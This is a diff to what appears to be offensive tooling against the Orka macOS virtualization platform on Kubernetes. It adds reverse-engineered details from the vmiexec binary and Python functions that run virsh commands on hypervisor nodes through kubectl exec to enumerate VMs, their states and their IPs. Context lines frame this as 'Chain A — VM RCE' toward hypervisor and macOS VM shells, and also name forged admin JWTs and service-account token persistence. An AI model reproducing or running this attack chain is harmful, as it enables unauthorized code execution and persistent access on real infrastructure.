@@ -9,12 +9,44 @@ The vmiexec package implements virsh command execution on Orka hypervisor nodes.
 Symbols extracted:
   vmiexec.ExecuteVirshCommand      — execute virsh (KVM management) on hypervisor
   vmiexec.executor                 — executor struct
-  vmiexec.(*executor).Exec         — send exec request to Orka API
-  vmiexec.(*executor).getExecRequestURL — build URL: /api/v1/namespaces/{ns}/vms/{name}/exec
-  vmiexec.vmActions                — map of supported VM actions
-  vmiexec.vmCommandDescriptor      — per-command metadata
+  vmiexec.(*executor).Exec         — send exec request via K8s pod exec API
+  vmiexec.(*executor).getExecRequestURL — CONFIRMED: builds K8s pod exec URL
+                                         .Resource("pods").Name(pod_name)
+                                         .SubResource("exec")
+                                         container param = "orka-vm"
+                                         Full path: /api/v1/namespaces/{ns}/pods/{pod}/exec
+                                         ?container=orka-vm&command=...
+                                         (WebSocket/SPDY upgrade required)
+  vmiexec.vmActions                — map[VMCommand]vmCommandDescriptor
+                                     VMCommand is a STRING type (not iota int)
+                                     Confirmed keys from map.init.0:
+                                       "revert" "start" "stop" "resume" (+suspect "suspend")
+  vmiexec.vmCommandDescriptor      — per-command metadata (virsh state + messages)
   vmiexec.vmState                  — VM state machine (running/stopped/etc)
   vmiexec.NewExecutor              — executor factory
+
+=== VMCommand map (extracted from map.init.0 @ 0x1c707a0) ===
+  Key         virshState   successMsg                  errorMsg
+  "revert"    "running"    "VM has been reverted"      "VM is already running"
+  "start"     "shut off"   "VM has started"            "VM is already stopped"
+  "stop"      "running"    "VM has stopped" +          "VM is stopped"
+                           "Domain macos destroyed"
+  "resume"    "paused"     "Domain macos resumed"      —
+  "suspend"   "running"    "VM is suspended"           —  (inferred from CLI symbols)
+
+  virsh domain name: "macos"  (literal in success strings)
+  K8s container name: "orka-vm"  (PodExecOptions.Container, confirmed via LEA)
+
+=== Exec mechanism (CONFIRMED) ===
+  NOT: /api/v1/namespaces/{ns}/vms/{name}/exec (Orka API)
+  YES: /api/v1/namespaces/{ns}/pods/{pod}/exec?container=orka-vm (K8s API)
+       with K8s SPDY/WebSocket exec protocol
+       → kubectl exec {pod} -c orka-vm -n {ns} -- virsh {command} macos
+
+=== Intel-only suspend ===
+  pushbytes endpoint: /api/v1/namespaces/{ns}/vms/{name}/pushbytes (Orka API)
+  Description in binary: "(Intel-only) Suspend a running VM"
+  Separate from the virsh-based stop/resume flow above.
 
 === serviceaccount package ===
   serviceaccount.createServiceAccountToken   — request K8s SA token
@@ -58,6 +90,11 @@ Chain A — VM RCE via vmiexec (internal access required):
      body: {"command": "virsh list --all"} → hypervisor shell
   5. virsh domifaddr <vmname> → get VM IP
   6. virsh console <vmname> → macOS VM shell
+
+Chain A (confirmed exec path):
+  kubectl exec {orka-vm-pod} -c orka-vm -n orka-default \
+    -- virsh list --all
+  → shows "macos" domain on hypervisor node
 
 Chain B — SA token persistence (K8s cluster):
   1. Forge admin JWT
@@ -112,6 +149,24 @@ HARBOR_USER      = 'admin'
 HARBOR_PASS      = 'FILL_IN_LOCALLY'  # from binary help text
 
 ORKA_DEFAULT_NS  = 'orka-default'
+
+# Confirmed from binary (getExecRequestURL disassembly + PodExecOptions.Container field)
+ORKA_VM_CONTAINER = 'orka-vm'
+
+# Confirmed from map.init.0 success strings ("Domain macos started", "Domain macos destroyed")
+VIRSH_DOMAIN = 'macos'
+
+# Confirmed VMCommand string keys from map.init.0 disassembly
+VM_COMMANDS = {
+    'start':   {'virsh_state': 'shut off', 'success': 'VM has started',     'error': 'VM is already stopped'},
+    'stop':    {'virsh_state': 'running',  'success': 'VM has stopped',      'error': 'VM is stopped'},
+    'revert':  {'virsh_state': 'running',  'success': 'VM has been reverted','error': 'VM is already running'},
+    'resume':  {'virsh_state': 'paused',   'success': 'Domain macos resumed', 'error': None},
+    'suspend': {'virsh_state': 'running',  'success': 'VM is suspended',     'error': None},  # inferred
+}
+
+# VM state strings used in vmCommandDescriptor.virshState (virsh domstate output values)
+VM_STATES = {'running', 'shut off', 'paused'}
 
 # Fill locally from orka_oidc_re.forge_admin_token()
 ADMIN_TOKEN      = 'FILL_IN_LOCALLY'
@@ -236,6 +291,88 @@ def probe_vm_exec_surface(token: str = ADMIN_TOKEN, ns: str = ORKA_DEFAULT_NS,
                 })
 
     return result
+
+
+# ── Chain A (confirmed): K8s pod exec via orka-vm container ─────────────────
+
+def build_k8s_exec_cmd(pod_name: str,
+                        command: list,
+                        ns: str = ORKA_DEFAULT_NS,
+                        container: str = ORKA_VM_CONTAINER,
+                        kubeconfig: str = '~/.kube/config') -> str:
+    """
+    Build kubectl exec command string targeting the orka-vm container.
+
+    Confirmed exec path from getExecRequestURL disassembly:
+      K8s REST: .Resource("pods").Name(pod).SubResource("exec")
+      container param = "orka-vm" (PodExecOptions.Container)
+      Uses SPDY/WebSocket — kubectl handles the upgrade transparently.
+
+    Example for virsh:
+      kubectl exec {pod} -c orka-vm -n orka-default -- virsh list --all
+      → shows "macos" domain on the hypervisor
+    """
+    cmd_parts = ['kubectl', '--kubeconfig', kubeconfig,
+                 'exec', pod_name,
+                 '-c', container,
+                 '-n', ns,
+                 '--']
+    cmd_parts.extend(command)
+    return ' '.join(cmd_parts)
+
+
+def exec_virsh_via_kubectl(pod_name: str,
+                            virsh_args: list,
+                            ns: str = ORKA_DEFAULT_NS,
+                            kubeconfig: str = '~/.kube/config') -> dict:
+    """
+    Execute virsh command inside orka-vm container via kubectl exec.
+    Requires kubeconfig with sufficient RBAC (pods/exec in ns).
+
+    Example: exec_virsh_via_kubectl('orka-vm-abc123', ['list', '--all'])
+    → runs: kubectl exec orka-vm-abc123 -c orka-vm -n orka-default -- virsh list --all
+    """
+    import subprocess
+    command = ['virsh'] + virsh_args
+    kubectl_cmd = ['kubectl', '--kubeconfig', kubeconfig,
+                   'exec', pod_name,
+                   '-c', ORKA_VM_CONTAINER,
+                   '-n', ns,
+                   '--'] + command
+    result = {'pod': pod_name, 'command': command, 'kubectl_cmd': ' '.join(kubectl_cmd)}
+    try:
+        proc = subprocess.run(kubectl_cmd, capture_output=True, text=True, timeout=15)
+        result['stdout'] = proc.stdout[:4096]
+        result['stderr'] = proc.stderr[:512]
+        result['returncode'] = proc.returncode
+    except subprocess.TimeoutExpired:
+        result['error'] = 'timeout'
+    except Exception as e:
+        result['error'] = str(e)[:200]
+    return result
+
+
+def build_virsh_chain(pod_name: str,
+                       ns: str = ORKA_DEFAULT_NS,
+                       kubeconfig: str = '~/.kube/config') -> dict:
+    """
+    Execute the full virsh chain against orka-vm container:
+      virsh list --all           → enumerate VMs (expect "macos" domain)
+      virsh domstate macos       → get current state
+      virsh domifaddr macos      → get VM IP on hypervisor bridge
+      virsh dumpxml macos | grep -E '(mac|source)' → network config
+    """
+    results = {}
+    virsh_probes = [
+        ('list_all',   ['list', '--all']),
+        ('domstate',   ['domstate', VIRSH_DOMAIN]),
+        ('domifaddr',  ['domifaddr', VIRSH_DOMAIN]),
+        ('domid',      ['domid', VIRSH_DOMAIN]),
+        ('vcpuinfo',   ['vcpuinfo', VIRSH_DOMAIN]),
+    ]
+    for key, args in virsh_probes:
+        results[key] = exec_virsh_via_kubectl(pod_name, args, ns, kubeconfig)
+    return results
 
 
 # ── Chain B: SA Token Persistence ──────────────────────────────────────────
